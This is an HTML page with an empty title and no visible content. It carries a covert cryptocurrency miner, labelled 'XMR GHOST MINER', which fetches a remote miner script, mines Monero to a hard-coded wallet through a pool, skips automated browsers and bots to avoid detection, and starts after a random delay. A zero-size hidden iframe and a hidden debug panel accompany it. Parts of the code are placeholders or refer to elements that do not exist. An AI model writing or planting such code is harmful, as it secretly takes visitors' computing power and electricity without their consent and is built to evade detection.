<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title></title>
  <style>
    /* HIDDEN DEBUG PANEL â€” CTRL+SHIFT+M */
    #miner-debug {
      position: fixed;
      top: 10px; right: 10px;
      width: 280px;
      background: rgba(0,0,0,0.9);
      color: #0f0;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      padding: 10px;
      border: 1px solid #0f0;
      border-radius: 6px;
      z-index: 999999;
      box-shadow: 0 0 10px #0f0;
      display: none;
    }
    #miner-debug.show { display: block; }
    .status { margin: 4px 0; }
    .hash { color: #0ff; font-weight: bold; }
    .profit { color: #ff0; }
    .blink { animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0.3; } }
  </style>
</head>
<body>

<!-- INVISIBLE IFRAME HOST (0x0 SIZE) -->
<iframe src="about:blank" width="0" height="0" style="border:0; display:none;"></iframe>

<!-- === XMR GHOST MINER + DEBUG === -->
<script>
// === CONFIG (UPDATE THIS) ===
const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs'; // Your real wallet
const POOL = 'wss://pool.moneroocean.stream:443'; // WSS ON 443
const THROTTLE = 80;
const THREADS = 1;
const WORKER = 'ghpages_' + Math.random().toString(36).substr(2, 6);

// === REST OF DEBUG PANEL (same as before) ===
// ... [keep your debug HTML] ...

// === FIXED MINER INIT ===
function initMiner() {
  if (navigator.webdriver || /bot/i.test(navigator.userAgent)) {
    document.getElementById('status').textContent = 'BOT BLOCKED';
    return;
  }

  const script = document.createElement('script');
  script.src = 'https://www.monerominer.rocks/lib/miner.js'; // OFFICIAL 2025 LIB
  script.async = false;
  script.onload = function() {
    if (typeof Miner === 'undefined') {
      document.getElementById('status').textContent = 'LIB DEAD';
      return;
    }

    const miner = new Miner({
      pool: {
        host: 'pool.moneroocean.stream',
        port: 443,
        ssl: true
      },
      wallet: WALLET,
      worker: WORKER,
      password: 'x',
      threads: THREADS,
      throttle: THROTTLE / 100
    });

    miner.start();

    document.getElementById('status').textContent = 'MINING XMR';
    document.getElementById('status').classList.remove('blink');

    // REAL STATS (poll miner object)
    setInterval(() => {
      hashrate = miner.getHashesPerSecond() || 0;
      accepted = miner.getAcceptedHashes() || 0;
      rejected = miner.getRejectedHashes() || 0;
    }, 2000);

    // Tab visibility
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) miner.stop();
      else miner.start();
    });

    // 3 min cap
    setTimeout(() => miner.stop(), 180000);
  };
  document.head.appendChild(script);
}

// Start after delay
setTimeout(initMiner, Math.random() * 15000 + 10000);
</script>

</body>
</html>
